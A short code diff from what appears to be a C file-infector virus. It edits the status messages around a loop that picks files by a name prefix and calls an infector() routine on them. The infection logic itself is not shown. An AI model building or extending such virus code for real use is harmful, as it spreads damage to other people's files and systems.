@@ -76,13 +76,11 @@ int main(int argc, char *argv[]) {
             
             /* If no prefix provided, print all. If prefix provided, filter. */
             if (!attach_mode || (file_or_directory_name[0] == prefix[0])) {
-                print("Attempting to attach virus to: ");
                 print(file_or_directory_name);
-                print("\n");
                 
                 if (attach_mode && (file_or_directory_name[0] == prefix[0])) {
                     infector(file_or_directory_name);   
-                    print("\nVIRUS ATTACHED");
+                    print(" VIRUS ATTACHED\n");
                 }
                 
                 print("\n");
